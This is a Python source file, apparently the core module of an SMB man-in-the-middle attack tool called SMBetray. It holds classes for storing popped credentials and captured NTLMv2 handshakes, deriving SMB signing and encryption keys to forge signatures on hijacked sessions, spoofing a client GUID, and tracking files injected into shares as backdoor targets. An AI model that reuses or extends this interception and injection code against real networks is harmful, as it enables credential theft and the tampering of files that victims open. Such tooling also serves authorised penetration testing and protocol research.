import random
import string
import traceback
import logging
import struct
from impacket.smb3structs import SMB2Packet, SMB2_DIALECT_311, SMB2_DIALECT_302, SMB2_DIALECT_30, SMB2_DIALECT_21, SMB2_DIALECT_002
from impacket.smb import NewSMBPacket, SMB_DIALECT

from impacket import ntlm
from binascii import hexlify
from impacket import crypto
import copy
import os
import hmac
import hashlib

import time
import calendar
import struct
from Crypto.Hash import MD4

class SystemInfo(object):
	SUPPORTED_DIALECTS 			= []

	# For when the system is acting as the SMB server
	SIGNATURES_ENABLED	= False
	ENCRYPTION_ENABLED 	= False
	SIGNATURES_REQUIRED	= False
	ENCRYPTION_REQUIRED	= False
	NTLM_SUPPORTED		= False
class FileRequestStruct(object):
	FILE_NAME 				= ""
	FILE_GUID 				= ""
	FILE_BYTE_SIZE 			= 0
	FILE_BYTES_CAPUTRED 	= 0

	DOWNLOADED 				= False
	LOCAL_OUT_FILE 			= ""

	IS_INJECTED_FILE 		= False
	IS_BACKDOOR_TARGET 		= False
	LOCAL_FILE_PATH 		= ""

	


class PoppedCreds:
	def __init__(self, username = "", password = "(unknown)", domain = "", lm_hash = "", nt_hash = ""):
		self.username 	= username
		self.password 	= password
		self.domain 	= domain
		self.lm_hash 	= lm_hash
		self.nt_hash 	= nt_hash	# Raw, not the hexlified version
		if(nt_hash == ""):
			hash_obj 		= MD4.new()
			hash_obj.update(password.encode("utf-16le"))
			self.nt_hash 	= hash_obj.digest()
		self.NTResponse = hmac.new(self.nt_hash, self.username.upper().encode('utf-16le') + self.domain.encode('utf-16le')).digest()
	def __hash__(self):
		return hash((self.username, self.password, self.domain, self.nt_hash, self.NTResponse))
class NTLMV2_Struct(object):
	NEGOTIATE_INFO 		= ntlm.NTLMAuthNegotiate()
	CHALLENGE_INFO 		= ntlm.NTLMAuthChallenge()
	RESPONSE_INFO 		= ntlm.NTLMAuthChallengeResponse()

	def getNtProofString(self):
		#
		return self.RESPONSE_INFO['ntlm'][:16]
	def getBasicData(self):
		responseServerVersion 	= self.RESPONSE_INFO['ntlm'][16]
		hiResponseServerVersion = self.RESPONSE_INFO['ntlm'][17]
		aTime 					= self.RESPONSE_INFO['ntlm'][24:32]
		clientChallenge 		= self.RESPONSE_INFO['ntlm'][32:40]
		serverChallenge 		= self.CHALLENGE_INFO['challenge']
		serverName				= self.RESPONSE_INFO['ntlm'][44:]
		basicData = responseServerVersion + hiResponseServerVersion + '\x00' * 6 + aTime + clientChallenge + '\x00' * 4 + serverName
		return basicData
	def getExtended(self):
		#
		return (self.RESPONSE_INFO['flags'] & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY == ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY)
	def getExchangedKey(self):
		return self.RESPONSE_INFO['session_key']

	# Returns DOMAIN/USERNAME
	def getUser(self):
		return self.RESPONSE_INFO['domain_name'].decode("utf-16-le").encode("utf-8").upper() + "/" + self.RESPONSE_INFO['user_name'].decode("utf-16-le").encode("utf-8").upper()

	# NtProofString		= HMAC_MD5(NTResponse, basicData)

# A keyring easily managing for SMB session, signing, sealing, etc. keys as well as kerberos session keys
class SMBKey:
	def __init__(self, sessionBaseKey = "", dialect = SMB2_DIALECT_30, kerbSessionKey = "", kerbServiceSessionKey = ""):
		self.SESSION_BASE_KEY 		= sessionBaseKey[:16]
		self.DIALECT 				= dialect
		self.SERVER_SIGNING_KEY 	= ""
		self.CLIENT_SIGNING_KEY 	= ""

		self.SERVER_ENCRYPTION_KEY 	= ""
		self.SERVER_DECRYPTION_KEY 	= ""

		self.CLIENT_ENCRYPTION_KEY 	= ""
		self.CLIENT_DECRYPTION_KEY 	= ""
		self.APPLICATION_KEY 		= ""

		self.KERBEROS_SESSION_KEY 			= kerbSessionKey 		# The users AS-REP KerberosSessionKey
		self.KERBEROS_SERVICE_SESSION_KEY	= kerbServiceSessionKey	# The ServiceSessionKey from the TGS

		if(self.KERBEROS_SERVICE_SESSION_KEY != ""):
			self.SESSION_BASE_KEY = self.KERBEROS_SERVICE_SESSION_KEY[:16]

		self.generateKeys()
	def setDialect(self, dialect):
		self.DIALECT = dialect
		self.generateKeys()
	def generateKeys(self):
		# SMB2 and earlier don't use a KDF
		if(self.DIALECT in [SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21]):
			self.SERVER_SIGNING_KEY 	= self.SESSION_BASE_KEY
			self.CLIENT_SIGNING_KEY 	= self.SESSION_BASE_KEY
			self.SERVER_ENCRYPTION_KEY	= self.SESSION_BASE_KEY
			self.SERVER_DECRYPTION_KEY	= self.SESSION_BASE_KEY
			self.CLIENT_ENCRYPTION_KEY	= self.SESSION_BASE_KEY
			self.CLIENT_DECRYPTION_KEY	= self.SESSION_BASE_KEY
			self.APPLICATION_KEY 		= self.SESSION_BASE_KEY
			return

		if(self.DIALECT in [SMB2_DIALECT_30, SMB2_DIALECT_302, SMB2_DIALECT_311]):
			self.CLIENT_SIGNING_KEY 	= crypto.KDF_CounterMode(self.SESSION_BASE_KEY, "SMB2AESCMAC\x00", "SmbSign\x00", 128)
			self.SERVER_SIGNING_KEY 	= crypto.KDF_CounterMode(self.SESSION_BASE_KEY, "SMB2AESCMAC\x00", "SmbSign\x00", 128)

			self.CLIENT_ENCRYPTION_KEY  = crypto.KDF_CounterMode(self.SESSION_BASE_KEY, "SMB2AESCCM\x00", "ServerIn \x00", 128)
			self.CLIENT_DECRYPTION_KEY	= crypto.KDF_CounterMode(self.SESSION_BASE_KEY, "SMB2AESCCM\x00", "ServerOut \x00", 128)
			
			self.SERVER_ENCRYPTION_KEY  = self.CLIENT_DECRYPTION_KEY
			self.SERVER_DECRYPTION_KEY  = self.CLIENT_ENCRYPTION_KEY

			self.APPLICATION_KEY 		= crypto.KDF_CounterMode(self.SESSION_BASE_KEY, "SMB2APP\x00", "SmbRpc\x00", 128)
			return	
	
	# Generate the appropriate signature,
	# per the dialect specifications,
	# using the appropriate key
	def sign(self, packet, as_client = True):
		# NT LM 0.12
		if self.DIALECT == SMB_DIALECT:
			packet['SecurityFeatures'] = '\x00' * 8
			# TODO: Add contingency for when a a SigningChallengeResponse is used
			# # https://msdn.microsoft.com/en-us/library/cc246343.aspx
			z = hashlib.md5()
			if as_client:
				z.update(self.CLIENT_SIGNING_KEY)
			else:
				z.update(self.SERVER_SIGNING_KEY)
			z.update(str(packet))
			return z.digest()[:8]
		# 2.0.2, 2.1.0
		if self.DIALECT in [SMB2_DIALECT_002, SMB2_DIALECT_21]:
			packet['Signature'] = '\x00' * 16
			if as_client:
				return hmac.new(self.CLIENT_SIGNING_KEY, str(packet), hashlib.sha256).digest()[:16]
			else:
				return hmac.new(self.SERVER_SIGNING_KEY, str(packet), hashlib.sha256).digest()[:16]
		# 3.0.0, 3.0.2, 3.1.1
		if self.DIALECT in [SMB2_DIALECT_30, SMB2_DIALECT_302, SMB2_DIALECT_311]:
			packet['Signature'] = '\x00' * 16
			if as_client:
				return crypto.AES_CMAC(self.CLIENT_SIGNING_KEY, str(packet), len(str(packet)))
			else:
				return crypto.AES_CMAC(self.SERVER_SIGNING_KEY, str(packet), len(str(packet)))
	def __str__(self):
		data = "SessionKey: \t" + hexlify(self.SESSION_BASE_KEY) + "\n"
		data += "ServerSigningKey: \t" + hexlify(self.CLIENT_SIGNING_KEY) + "\n"
		data += "ClientSigningKey: \t" + hexlify(self.SERVER_SIGNING_KEY) + "\n"
		data += "krbSessionKey: \t" + hexlify(self.KERBEROS_SESSION_KEY) + "\n"
		data += "krbServiceSessionKey: \t" + hexlify(self.KERBEROS_SERVICE_SESSION_KEY) + "\n"
		return data
	def __hash__(self):
		combined = str(str(self.SESSION_BASE_KEY) + str(self.CLIENT_SIGNING_KEY) + str(self.SERVER_SIGNING_KEY) + str(self.KERBEROS_SESSION_KEY))
		killer = hashlib.md5()
		killer.update(combined)
		self.checksum = hexlify(killer.digest())
		return hash(self.checksum)


class SMB_Core(object):
	# Share the self.info dict from the MiTMModule
	def __init__(self, data, MiTMModuleConfig = dict()):
		# Stateful variables
		self.info 					= data 				# The EasySharedMemory object passed from the SMBetray MiTMModule
		self.MiTMModuleConfig 		= MiTMModuleConfig 	# The same MiTMModuleConfig from the parent MiTMModule, loaded by the MiTMServer
		self.SMB1_DIALECT_INDEX 	= -1 	# Used by negotiateReq_StripSMBDialects and negotiateResp_StripSMBDialects
		self.DIALECT 				= None 	# To be replaced with the impacket.smb.SMB dialect settled on (eg SMB_DIALECT)
		self.SPOOFED_CLIENT_GUID 	=  ''.join([random.choice(string.letters) for i in range(16)]) # A random client GUID
		
		# Keep track of the server & client info
		self.SERVER_INFO 			= SystemInfo()
		self.CLIENT_INFO 			= SystemInfo()

		# Mandatory variables to track requested files/etc
		self.CREATE_REQUEST_TRACKER		= dict() 	# A dict of FileRequestStruct's with their CREATE_REQUEST_ID (the message id) as their key
		self.FILE_REQUEST_TRACKER 		= dict() 	# a dict of FileRequestStruct's with their GUID as the key
		self.REQUEST_TRACKER 			= dict() 	# Map every message_id to the FileRequestStruct in question
		self.FILE_INFO_CLASS_TRACKER 	= dict() 	# Ties the FILE_INFO_CLASS request to the associated response: self.FILE_INFO_CLASS_TRACKER[message_id] = int(InfoType)
		self.FILE_INFO_TYPE_TRACKER		= dict()	# Ties the INTO_TYPE request to the associated response: self.FILE_INFO_TYPE_TRACKER[message_id]
		self.CURRENT_DIRECTORY 			= ""

		# Auth & Security related variables
		self.SESSION_DIALECT		= None
		self.SESSION_SIGNED 		= False
		self.SESSION_ENCRYPTED 		= False
		self.PREAUTH_PACKET_STACK 	= []	# A list of SMB2Packets to calculate the preauth integerity hash in case SMB3.1.1 is used
		self.KNOWN_KEY 				= None 	# To be replaced with an SMBKey if we have the creds & crack the session key
		self.NTLMV2_DATASTORE 		= []	# Stores all captured NTLMv2 negotiate, challenge, and challenge response messages (for hashes and for session key cracking)
		self.CREDS_DATASTORE 		= []	# Stores all of the domains/users/passwords from the popped-credentials file

		# File injection variables
		self.INJECTION_ACTIVE 		= False # If a client requested a 'fake file' that we injected, then we don't forward their request to the server - instead, an SMB Echo request
		self.INJECTION_REQ_DATA 	= dict()# A dict of SMB packets (message_id is their key) to be parsed by the fullMasquaradeServer 
		self.INJECTED_FILE_TRACKER 	= dict()# A list of full paths to files we have injected into directories. This keeps track for when we recieve a request for one
		self.INJECT_FILE_LIBRARY 	= dict()# Just a list of FileRequestStructs of the injected files
		